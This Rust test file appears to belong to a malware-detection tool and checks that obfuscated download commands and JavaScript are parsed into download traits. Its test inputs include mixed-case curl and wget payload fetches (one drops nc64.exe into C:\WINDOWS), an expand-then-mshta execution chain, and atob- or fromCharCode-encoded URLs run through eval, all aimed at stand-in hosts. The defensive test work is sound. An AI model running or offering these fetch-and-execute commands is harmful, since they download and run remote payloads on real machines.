            "vjik -o Autoit3.exe http://alias.example:2351\r\n",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://alias.example:2351"
                        && dst.as_deref() == Some("Autoit3.exe")
            )
        });
        assert!(
            has,
            "no structured Download from trailing-dot copied curl alias: {:?}",
            env.traits
        );
    }
    ...
    #[test]
    fn expand_preserves_download_source_for_later_execution() {
        let report = crate::analyze(
            br#"curl -o payload.cab https://expand-download.example/payload.cab
expand payload.cab dropped.hta
mshta dropped.hta"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    ...
                    Trait::UrlArgument { cmd, url }
                        if cmd == "mshta dropped.hta"
                            && url == "https://expand-download.example/payload.cab"
                )
            }),
            "expand extracted artifact was not linked on later execution: {:?}",
            report.traits
        );
        assert!(
            report
...
mshta C:/Out/payload.hta"#,
    ...
    #[test]
    fn curl_style_compact_flags_trailing_dot_exe_in_deob_text_emits_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#""C:\Tools\rdl.exe." -LJOk https://cdn-dot.example/files/steam.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://cdn-dot.example/files/steam.exe"
                        && dst.as_deref() == Some("steam.exe")
            )
        });
        assert!(
            has,
            "no structured Download from trailing-dot curl-style compact flags: {:?}",
            env.traits
        );
    }
    ...
    #[test]
    fn echoed_curl_output_colon_mixed_case_emits_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"(echo CuRl --OuTpUt:steam.exe https://cdn.example/files/steam.exe )"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
        ...
        assert!(
            has,
            "no structured Download from mixed-case echoed curl --output: flag: {:?}",
            env.traits
        );
    }
    ...
    fn curl_output_equals_in_deob_text_emits_clean_destination() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"CuRl --OuTpUt=C:\Temp\payload.bin hTtPs://curlpayload.example/payload.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curlpayload.example/payload.bin"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
            )
        });
        assert!(
    ...
    #[test]
    fn wget_mixed_case_output_document_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"WgEt --no-check-certificate http://%%B/win/nc64.exe --OuTpUt-DoCuMeNt=C:\WINDOWS\nc64.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
...
$v = 'fTp:\\var-liberal.example\stage.dat'"#,
    ...
    #[test]
    fn wget_output_prefix_resolves_to_downloaded_filename() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"wget https://wget-prefix.example/payload.exe -P C:\Temp"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://wget-prefix.example/payload.exe"
                        && dst.as_deref() == Some("C:\\Temp\\payload.exe")
            )
        });
        assert!(
            has,
            "wget -P destination was not resolved to the file path: {:?}",
            env.traits
        );
    }
...
mod js_url_extraction_tests {
    ...
    #[test]
    fn js_string_concat_with_unicode_prefix_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let js = "🙂var a=\"http://evil.example/u\"; GetObject(a)"
            .as_bytes()
            .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://evil.example/u"
            )
        });
        assert!(
            has,
            "JS concat URL with unicode prefix missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_script_prefix_url_extracted_without_lowercasing() {
        let mut env = Environment::new(&Config::default());
        let js = br#"GetObject("sCrIpT:https://script-js.example/payload")"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://script-js.example/payload"
            )
        });
    ...
    #[test]
    fn js_trailing_punctuation_is_trimmed_from_url() {
        let mut env = Environment::new(&Config::default());
        let js = br#"GetObject("https://js.example/payload?x=1!")"#.to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Download { src, .. } if src == "https://js.example/payload?x=1"
            )
        });
        assert!(
            has,
            "JS trailing punctuation was not trimmed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_mixed_case_atob_and_decode_uricomponent_extracted() {
        let mut env = Environment::new(&Config::default());
        ...
        let js = format!(
            r#"eval(aToB("{encoded}")); eval(dEcOdEuRiCoMpOnEnT("https%3A%2F%2Fpercent-js.example%2Fp"))"#
        )
        .into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let atob = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://atob-js.example/p"
            )
        });
        let percent = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://percent-js.example/p"
            )
        });
        assert!(
            atob && percent,
            "JS mixed-case decode missed: {:?}",
            env.traits
        );
    }
    ...
    #[test]
    fn js_fromcharcode_uppercase_hex_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        let chars = "https://char-upperhex-js.example/p"
            .bytes()
        ...
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://char-upperhex-js.example/p"
            )
        });
        assert!(
            has,
            "JS fromCharCode uppercase hex URL missed: {:?}",
            env.traits
        );
    }

    #[test]
    fn js_fromcharcode_bracket_property_payload_url_extracted() {
        let mut env = Environment::new(&Config::default());
        ...
        assert!(
            has,
            "JS fromCharCode bracket property URL missed: {:?}",
            env.traits
        );
    }
    ...
    fn js_atob_payload_with_ascii_whitespace_extracted() {
        ...
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-js.example/whitespace')",
        );
        let spaced = format!("{}\n{}\t{}", &encoded[..8], &encoded[8..16], &encoded[16..]);
        let js = format!(r#"eval(atob("{spaced}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Download { src, .. } if src == "https://atob-js.example/whitespace"
            )
        });
        assert!(
            has,
    ...
    #[test]
    fn js_atob_inside_identifier_is_not_matched() {
        let mut env = Environment::new(&Config::default());
        let encoded = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            "fetch('https://atob-js.example/inner')",
        );
        let js = format!(r#"eval(myAtob("{encoded}"))"#).into_bytes();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        assert!(
            !env.traits.iter().any(|t| {
                matches!(t,
                    Trait::Download { src, .. } if src == "https://atob-js.example/inner"
                )
            }),
            "JS atob matched inside identifier: {:?}",
            env.traits
        );
    }
    ...
    fn js_variable_string_concat_url_extracted() {
        ...
        let js = br#"
            ...
            var b = "tp";
            var sep = "://";
            var host = "js-var-concat.example";
            var path = "/stage";
            var url = a + b + sep + host + path;
            WScript.CreateObject("WScript.Shell").Run(url);
        "#
        .to_vec();
        env.all_extracted_jscript.push(js);
        crate::js_scan::scan_js_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://js-var-concat.example/stage"
            )
        });
...
mod disguised_binary_tests {
    ...
    #[test]
    fn batch_sniffer_matches_mixed_case_markers() {
        assert!(super::looks_like_batch(
            b"ReM comment\r\nPoWeRsHeLl -Command echo hi\r\n"
        ));
        assert!(!super::looks_like_batch(b"plain text only"));
    }
